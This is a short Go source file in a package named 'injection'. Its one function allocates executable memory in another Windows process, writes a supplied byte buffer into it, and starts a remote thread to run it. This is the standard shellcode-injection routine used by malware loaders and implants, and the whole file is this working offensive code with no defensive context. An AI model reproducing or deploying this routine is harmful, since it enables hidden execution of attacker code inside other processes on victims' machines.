package injection

func inject(process uintptr, data []byte) {
	allocated, _, _ := api.ProcVirtualAllocEx.Call(process, 0, uintptr(len(data)), 0x3000, 0x40)
	windows.WriteProcessMemory(process, allocated, &data[0], uintptr(len(data)), nil)
	api.ProcCreateRemoteThread.Call(process, 0, 0, allocated, 0, 0, 0)
}
